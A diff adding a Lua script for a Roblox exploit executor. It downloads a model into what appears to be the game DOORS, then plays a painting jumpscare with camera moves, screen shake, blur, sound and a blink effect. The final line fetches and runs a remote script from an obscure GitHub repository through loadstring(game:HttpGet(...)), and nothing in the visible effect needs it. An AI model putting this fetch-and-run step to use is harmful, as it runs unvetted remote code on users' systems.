@@ -1,0 +1,388 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+
+local LPlayer = Players.LocalPlayer
+local Char = LPlayer.Character or LPlayer.CharacterAdded:Wait()
+
+local FileName = "PaintingBla.rbxm"
+local Url = "https://github.com/lynguyen26031993-design/-u/raw/refs/heads/main/Place_6839171747_Model_PaintingBla_1790439898.txt"
+
+if not isfile(FileName) then
+    writefile(FileName, game:HttpGet(Url))
+end
+
+local Asset = getcustomasset(FileName)
+local Model = game:GetObjects(Asset)[1]
+
+if not Model then
+    return
+end
+
+local LatestRoom = ReplicatedStorage.GameData.LatestRoom.Value
+local Room = workspace.CurrentRooms:FindFirstChild(tostring(LatestRoom))
+
+if not Room then
+    return
+end
+
+local Assets = Room:FindFirstChild("Assets")
+local LightFixtures = Assets and Assets:FindFirstChild("Light_Fixtures")
+
+if not LightFixtures then
+    return
+end
+
+local Fixtures = {}
+
+for _, Obj in ipairs(LightFixtures:GetChildren()) do
+    if Obj:IsA("Model") then
+        table.insert(Fixtures, Obj)
+    end
+end
+
+if #Fixtures == 0 then
+    return
+end
+
+local Fixture = Fixtures[math.random(1, #Fixtures)]
+local Stand = Fixture:FindFirstChild("Stand", true)
+
+if not Stand or not Stand:IsA("BasePart") then
+    return
+end
+
+for _, Obj in ipairs(Fixture:GetDescendants()) do
+    if Obj:IsA("Light")
+        or Obj:IsA("ParticleEmitter")
+        or Obj:IsA("Beam")
+        or Obj:IsA("Trail") then
+
+        Obj.Enabled = false
+
+    elseif Obj:IsA("BasePart") then
+        Obj.Transparency = 1
+    end
+end
+
+Model.Parent = workspace
+
+local Canvas = Model:FindFirstChild("Canvas", true)
+
+if not Canvas or not Canvas:IsA("BasePart") then
+    Model:Destroy()
+    return
+end
+
+local SurfaceGui = Canvas:FindFirstChild("SurfaceGui")
+local ImageLabel
+
+if SurfaceGui then
+    ImageLabel = SurfaceGui:FindFirstChild("ImageLabel")
+
+    if ImageLabel and ImageLabel:IsA("ImageLabel") then
+        ImageLabel.Image = "rbxassetid://12471460355"
+        ImageLabel.ImageTransparency = 0
+    end
+end
+
+local TargetCFrame =
+    Stand.CFrame + Stand.CFrame.LookVector * 0.25
+
+if Model:IsA("Model") then
+    Model:PivotTo(TargetCFrame)
+elseif Model:IsA("BasePart") then
+    Model.CFrame = TargetCFrame
+end
+
+local InteractPrompt = Model:FindFirstChild("InteractPrompt", true)
+
+if InteractPrompt and InteractPrompt:IsA("ProximityPrompt") then
+
+    InteractPrompt.Triggered:Connect(function(Player)
+
+        if Player ~= LPlayer then
+            return
+        end
+
+        InteractPrompt:Destroy()
+
+        local Camera = workspace.CurrentCamera
+
+        if not Camera then
+            return
+        end
+
+        Camera.CameraType = Enum.CameraType.Scriptable
+
+        local CameraPosition =
+            Canvas.Position + Canvas.CFrame.LookVector * 6
+
+        local TargetCameraCFrame =
+            CFrame.lookAt(
+                CameraPosition,
+                Canvas.Position
+            )
+
+        local StartCFrame = Camera.CFrame
+
+        local Duration = 1.5
+        local StartTime = tick()
+
+        local LerpConnection
+
+        LerpConnection = RunService.RenderStepped:Connect(function()
+
+            if not Camera.Parent or not Canvas.Parent then
+                LerpConnection:Disconnect()
+                return
+            end
+
+            local Alpha = math.clamp(
+                (tick() - StartTime) / Duration,
+                0,
+                1
+            )
+
+            Alpha = 1 - (1 - Alpha) ^ 3
+
+            Camera.CFrame =
+                StartCFrame:Lerp(
+                    TargetCameraCFrame,
+                    Alpha
+                )
+
+            if Alpha >= 1 then
+                LerpConnection:Disconnect()
+
+                Camera.CFrame = TargetCameraCFrame
+
+                pcall(function()
+                    RunService:UnbindFromRenderStep("PaintingBlaCamera")
+                end)
+
+                RunService:BindToRenderStep(
+                    "PaintingBlaCamera",
+                    Enum.RenderPriority.Camera.Value + 1,
+                    function()
+                        if not Camera.Parent or not Canvas.Parent then
+                            RunService:UnbindFromRenderStep("PaintingBlaCamera")
+                            return
+                        end
+
+                        Camera.CameraType = Enum.CameraType.Scriptable
+
+                        Camera.CFrame = CFrame.lookAt(
+                            CameraPosition,
+                            Canvas.Position
+                        )
+                    end
+                )
+
+                task.spawn(function()
+
+                    task.wait(2)
+
+                    if not ImageLabel or not ImageLabel.Parent then
+                        return
+                    end
+
+                    local OriginalPosition = ImageLabel.Position
+
+local Strength = Instance.new("NumberValue")
+Strength.Value = 0
+
+local ShakeRunning = true
+
+task.spawn(function()
+    while ShakeRunning and ImageLabel and ImageLabel.Parent do
+        local Power = math.floor(Strength.Value)
+
+        ImageLabel.Position =
+            OriginalPosition
+            + UDim2.fromOffset(
+                math.random(-Power, Power),
+                math.random(-Power, Power)
+            )
+
+        task.wait(0.01)
+    end
+
+    if ImageLabel and ImageLabel.Parent then
+        ImageLabel.Position = OriginalPosition
+    end
+end)
+
+local HALLU = Instance.new("Sound", workspace) 
+                    HALLU.Volume = 3
+                    HALLU.SoundId = "rbxassetid://135975888586873" 
+                    HALLU.RollOffMaxDistance = 100000000
+                    HALLU:Play() 
+
+local Blur = Instance.new("BlurEffect")
+Blur.Name = "PaintingBlaBlur"
+Blur.Size = 0
+Blur.Parent = game:GetService("Lighting")
+
+local TweenInfo4 = TweenInfo.new(
+    6,
+    Enum.EasingStyle.Sine,
+    Enum.EasingDirection.InOut
+)
+
+local StrengthTween = TweenService:Create(
+    Strength,
+    TweenInfo4,
+    {
+        Value = 5
+    }
+)
+
+local BlurTween = TweenService:Create(
+    Blur,
+    TweenInfo4,
+    {
+        Size = 56
+    }
+)
+
+StrengthTween:Play()
+BlurTween:Play()
+
+StrengthTween.Completed:Wait()
+
+HALLU:Destroy() 
+
+ShakeRunning = false
+
+if ImageLabel and ImageLabel.Parent then
+    ImageLabel.Position = OriginalPosition
+end
+
+Strength:Destroy()
+
+
+
+
+                    local PlayerGui = LPlayer:FindFirstChildOfClass("PlayerGui")
+
+                    if not PlayerGui then
+                        return
+                    end
+
+                    local BlinkGui = Instance.new("ScreenGui")
+                    BlinkGui.Name = "PaintingBlaBlink"
+                    BlinkGui.IgnoreGuiInset = true
+                    BlinkGui.ResetOnSpawn = false
+                    BlinkGui.DisplayOrder = 999999
+                    BlinkGui.Parent = PlayerGui
+
+                    local TopFrame = Instance.new("Frame")
+                    TopFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+                    TopFrame.BorderSizePixel = 0
+                    TopFrame.Size = UDim2.new(1, 0, 0.5, 0)
+                    TopFrame.Position = UDim2.new(0, 0, -0.5, 0)
+                    TopFrame.Parent = BlinkGui
+
+                    local BottomFrame = Instance.new("Frame")
+                    BottomFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+                    BottomFrame.BorderSizePixel = 0
+                    BottomFrame.Size = UDim2.new(1, 0, 0.5, 0)
+                    BottomFrame.Position = UDim2.new(0, 0, 1, 0)
+                    BottomFrame.Parent = BlinkGui
+
+                    local CloseTweenInfo = TweenInfo.new(
+                        0.1,
+                        Enum.EasingStyle.Sine,
+                        Enum.EasingDirection.InOut
+                    )
+
+                    local OpenTweenInfo = TweenInfo.new(
+                        0.3,
+                        Enum.EasingStyle.Sine,
+                        Enum.EasingDirection.InOut
+                    )
+
+                    local CloseTop = TweenService:Create(
+                        TopFrame,
+                        CloseTweenInfo,
+                        {
+                            Position = UDim2.new(0, 0, 0, 0)
+                        }
+                    )
+
+                    local CloseBottom = TweenService:Create(
+                        BottomFrame,
+                        CloseTweenInfo,
+                        {
+                            Position = UDim2.new(0, 0, 0.5, 0)
+                        }
+                    )
+
+                    CloseTop:Play()
+                    CloseBottom:Play()
+
+                    CloseTop.Completed:Wait()
+                    
+                    local where = Instance.new("Sound", workspace) 
+                    where.Volume = 1.5
+                    where.SoundId = "rbxassetid://14429444948" 
+                    where.RollOffMaxDistance = 100000000
+                    where:Play() 
+                    
+                    if Blur and Blur.Parent then
+    Blur:Destroy()
+end
+
+                    if ImageLabel and ImageLabel.Parent then
+                        ImageLabel:Destroy()
+                    end
+
+                    local OpenTop = TweenService:Create(
+                        TopFrame,
+                        OpenTweenInfo,
+                        {
+                            Position = UDim2.new(0, 0, -0.5, 0)
+                        }
+                    )
+
+                    local OpenBottom = TweenService:Create(
+                        BottomFrame,
+                        OpenTweenInfo,
+                        {
+                            Position = UDim2.new(0, 0, 1, 0)
+                        }
+                    )
+
+                    OpenTop:Play()
+                    OpenBottom:Play()
+
+                    OpenTop.Completed:Wait()
+
+                    task.wait(1)
+
+                    pcall(function()
+                        RunService:UnbindFromRenderStep("PaintingBlaCamera")
+                    end)
+
+                    BlinkGui:Destroy()
+
+                    Camera.CameraType = Enum.CameraType.Custom
+
+                    if Char and Char.Parent then
+                        local Hum = Char:FindFirstChildOfClass("Humanoid")
+
+                        if Hum then
+                            Camera.CameraSubject = Hum
+                        end
+                    end
+                    
+                    task.wait(1)
+                    
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/PAKKALCKKWKKJXIODKRBFHHAUJCJJJSNDJ/IMNCNJSJJDCUJSJDHHXHZHHXJJDJD/refs/heads/main/a150.lua"))() 
+                end)
+            end
+        end)
+    end)
+end
